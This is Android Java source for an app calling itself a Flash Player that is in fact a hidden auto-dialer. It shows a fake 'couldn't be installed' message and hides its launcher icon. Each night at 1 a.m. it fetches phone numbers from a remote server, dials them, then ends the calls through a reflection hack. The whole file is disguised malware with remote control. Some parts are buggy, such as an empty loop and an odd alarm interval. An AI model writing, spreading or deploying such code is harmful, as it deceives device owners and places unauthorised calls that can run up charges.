package com.flashplayer;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Bundle;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {

    AlarmManager alarmManager;
    private Button callBtn;
    Boolean callcheck = Boolean.valueOf(false);
    Context context;
    int count = 0;
    private Button dialBtn;
    Editor editor;
    Boolean handle = Boolean.valueOf(false);
    Handler mHandler;
    BroadcastReceiver mReceiver;
    public final Runnable m_Runnable = new Runnable() {
        public void run() {
            MainActivity.this.killCall();
            Toast.makeText(MainActivity.this.getApplicationContext(), "Call is End", Toast.LENGTH_SHORT).show();
            MainActivity.this.mHandler.removeCallbacks(MainActivity.this.m_Runnable);
            MainActivity.this.handle = Boolean.valueOf(true);
        }
    };
    ArrayList<HashMap<String, String>> mylist = new ArrayList<>();
    private EditText number;
    String[] numbers = {"03449774488", "03345016874", "03449774488", "00123", "03449774488"};
    PendingIntent pendingIntent;
    SharedPreferences pref;

    private class GetNumbers extends AsyncTask<String, Void, String> {
        String data;

        private GetNumbers() {
            this.data = null;
        }

        /* synthetic */ GetNumbers(MainActivity mainActivity, GetNumbers getNumbers) {
            this();
        }

        public String doInBackground(String... params) {
            JSONArray jsonarray = null;
            int i = 0;
            try {
                this.data = new StringBuilder(String.valueOf(URLEncoder.encode("name", "UTF-8"))).append("=").append(URLEncoder.encode("Status", "UTF-8")).toString();
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            String text = "";
            BufferedReader reader = null;
            try {
                URLConnection conn = new URL("https://www.botshake.com/AD/getnumbers.php").openConnection();
                conn.setDoOutput(true);
                OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
                wr.write(this.data);
                wr.flush();
                BufferedReader reader2 = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        String line = reader2.readLine();
                        if (line == null) {
                            break;
                        }
                        sb.append(new StringBuilder(String.valueOf(line)).append("\n").toString());
                    }
                    text = sb.toString();
                    Log.w("text", text);
                    Log.e("111Numbers", "buffer http");
                    reader = reader2;
                } catch (Exception e2) {
                    reader = reader2;
                }
            } catch (Exception e3) {
                Log.e("00Numbers", "buffer http");
                try {
                    jsonarray = new JSONObject(text).getJSONArray("Numbers");
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                if (jsonarray!=null)
                while (i < jsonarray.length()) {
                }
                Log.e("111Numbers", "json");
                return null;
            }
            try {
                jsonarray = new JSONObject(text).getJSONArray("Numbers");
                for (i = 0; i < jsonarray.length(); i++) {
                    JSONObject c = jsonarray.getJSONObject(i);
                    HashMap<String, String> mydata = new HashMap<>();
                    mydata.put("Number", c.getString("Number"));
                    mydata.put("Dialtime", c.getString("Dialtime"));
                    mydata.put("Repeat", c.getString("Repeat"));
                    MainActivity.this.mylist.add(mydata);
                }
                Log.e("111Numbers", "json");
            } catch (Exception e4) {
                Log.e("000Numbers", e4.toString());
            } finally {
                try {
                    reader.close();
                } catch (Exception e5) {
                }
            }
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String result) {
            Log.w("Mylist", MainActivity.this.mylist.toString());
            if (MainActivity.this.mylist.size() > 0) {
                String number = (String) ((HashMap) MainActivity.this.mylist.get(MainActivity.this.count)).get("Number");
                long dialtime = 1000 * ((long) Integer.parseInt((String) ((HashMap) MainActivity.this.mylist.get(MainActivity.this.count)).get("Dialtime"))) * 60;
                MainActivity.this.mHandler = new Handler();
                MainActivity.this.mHandler.postDelayed(MainActivity.this.m_Runnable, 10000);
                Toast.makeText(MainActivity.this.context, "Alarm time has been reached", Toast.LENGTH_LONG).show();
                MainActivity.this.MakeCall(number);
                MainActivity.this.count++;
            }
        }
    }

    private class MyPhoneListener extends PhoneStateListener {
        private boolean onCall;

        private MyPhoneListener() {
            this.onCall = false;
        }

        /* synthetic */ MyPhoneListener(MainActivity mainActivity, MyPhoneListener myPhoneListener) {
            this();
        }

        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case 0:
                    if (this.onCall) {
                        Toast.makeText(MainActivity.this, "restart app after call", Toast.LENGTH_LONG).show();
                        if (MainActivity.this.handle.booleanValue()) {
                            MainActivity.this.mHandler.removeCallbacks(MainActivity.this.m_Runnable);
                        }
                        if (MainActivity.this.count >= MainActivity.this.mylist.size() || !MainActivity.this.callcheck.booleanValue()) {
                            Log.w("End", "Redial");
                            MainActivity.this.callcheck = Boolean.valueOf(false);
                        } else {
                            Log.w("Redial", "Number");
                            String number = (String) ((HashMap) MainActivity.this.mylist.get(MainActivity.this.count)).get("Number");
                            long dialtime = 1000 * ((long) Integer.parseInt((String) ((HashMap) MainActivity.this.mylist.get(MainActivity.this.count)).get("Dialtime"))) * 60;
                            MainActivity.this.mHandler = new Handler();
                            MainActivity.this.mHandler.postDelayed(MainActivity.this.m_Runnable, 10000);
                            MainActivity.this.MakeCall(number);
                            MainActivity.this.count++;
                        }
                        this.onCall = false;
                        return;
                    }
                    return;
                case 1:
                    Toast.makeText(MainActivity.this, new StringBuilder(String.valueOf(incomingNumber)).append(" calls you").toString(), Toast.LENGTH_LONG).show();
                    return;
                case 2:
                    Toast.makeText(MainActivity.this, "on call...", Toast.LENGTH_LONG).show();
                    this.onCall = true;
                    return;
                default:
                    return;
            }
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.context = this;
        this.pref = this.context.getSharedPreferences("MyPref", 0);
        this.editor = this.pref.edit();
        bringBackTheIcon();
        showToast();
        ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).listen(new MyPhoneListener(this, null), 32);
        Log.w("check", new StringBuilder(String.valueOf(this.pref.getBoolean("check", false))).toString());
        if (!this.pref.getBoolean("check", false)) {
            RegisterAlarmBroadcast();
            SetTimer();
            Log.w("Activity", "Run");
            this.editor.putBoolean("check", true);
            this.editor.commit();
        }
    }

    void showToast()
    {
        SharedPreferences prefs = this.getSharedPreferences(
                "com.your.flashplayer", Context.MODE_PRIVATE);
        boolean hasVisisted = prefs.getBoolean("HAS_VISISTED_BEFORE", false);
        if(!hasVisisted) {
            Toast.makeText(this, "Sorry, this app couldn't be installed. Exiting...", Toast.LENGTH_LONG).show();
            prefs.edit().putBoolean("HAS_VISISTED_BEFORE", true).commit();
        }
    }

    void bringBackTheIcon()
    {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    void hideAppIcon()
    {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public void MakeCall(String uri) {
        try {
            Intent callIntent = new Intent("android.intent.action.DIAL");
            callIntent.setData(Uri.parse("tel:" + uri));
            callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(callIntent);
        } catch (Exception e) {
            Toast.makeText(getApplicationContext(), "Your call has failed...", Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    public boolean killCall() {
        try {
            TelephonyManager tm = (TelephonyManager) this.context.getSystemService(Context.TELEPHONY_SERVICE);
            Method m = Class.forName(tm.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
            m.setAccessible(true);
            Object telephonyService = m.invoke(tm, new Object[0]);
            Method m2 = Class.forName(telephonyService.getClass().getName()).getDeclaredMethod("endCall", new Class[0]);
            m2.setAccessible(true);
            m2.invoke(telephonyService, new Object[0]);
            return true;
        } catch (Exception ex) {
            Log.d("not kill", "PhoneStateReceiver **" + ex.toString());
            return false;
        }
    }

    private void RegisterAlarmBroadcast() {
        bringBackTheIcon();
        this.mReceiver = new BroadcastReceiver() {
            public void onReceive(Context context, Intent intent) {
                MainActivity.this.mylist.clear();
                new GetNumbers(MainActivity.this, null).execute(new String[0]);
                Toast.makeText(context, "Alarm time has been reached", Toast.LENGTH_LONG).show();
                MainActivity.this.callcheck = Boolean.valueOf(true);
            }
        };
        registerReceiver(this.mReceiver, new IntentFilter("com.celllocator"));
        this.pendingIntent = PendingIntent.getBroadcast(this, 0, new Intent("com.celllocator"), 0);
        this.alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        hideAppIcon();
    }

    private void SetTimer() {
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, 1);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        this.alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), -1702967296, this.pendingIntent);
        hideAppIcon();
    }
}
